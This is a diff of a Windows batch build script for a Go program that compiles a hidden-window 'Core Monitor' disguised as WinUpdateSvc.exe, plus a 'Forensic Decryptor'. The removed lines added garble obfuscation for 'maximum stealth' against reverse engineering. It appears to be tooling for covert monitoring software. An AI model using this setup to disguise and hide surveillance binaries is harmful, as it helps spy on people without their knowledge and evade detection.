@@ -22,29 +22,18 @@ if not exist main.go (
 ::   -trimpath          = Remove local filesystem paths from binary
 ::
 :: GARBLE (optional, install with: go install mvdan.cc/garble@latest):
-::   -literals          = Obfuscate string literals at compile time
-::   -tiny              = Strip extra metadata (file/line numbers, panic info)
-::   These make the binary MUCH harder to reverse-engineer.
 :: -------------------------------------------------------
-set LDFLAGS=-H windowsgui -s -w -buildid=
-
-:: Check if garble is available for advanced obfuscation
-where garble >nul 2>nul
-if %ERRORLEVEL% EQU 0 (
-    echo [*] Garble detected — building with full obfuscation...
-    set BUILD_CMD=garble -literals -tiny build
-) else (
-    echo [*] Garble not found — building with standard flags...
-    echo     Install garble for maximum stealth: go install mvdan.cc/garble@latest
-    set BUILD_CMD=go build
-)
+set LDFLAGS=-s -w -buildid=
+set BUILD_CMD=go build
 
 echo.
 echo [1/3] Building Core Monitor (WinUpdateSvc.exe)...
-%BUILD_CMD% -trimpath -ldflags "%LDFLAGS%" -o WinUpdateSvc.exe main.go
+echo     Generating manifest resource...
+rsrc -manifest WinUpdateSvc.manifest -o WinUpdateSvc.syso
+%BUILD_CMD% -trimpath -ldflags "%LDFLAGS% -H windowsgui" -o WinUpdateSvc.exe main.go
 if %ERRORLEVEL% NEQ 0 (
     echo Failed to build WinUpdateSvc.exe
-    exit /b
+    exit /b 1
 )
 
 echo [2/3] Building Forensic Decryptor (Decryptor.exe)...
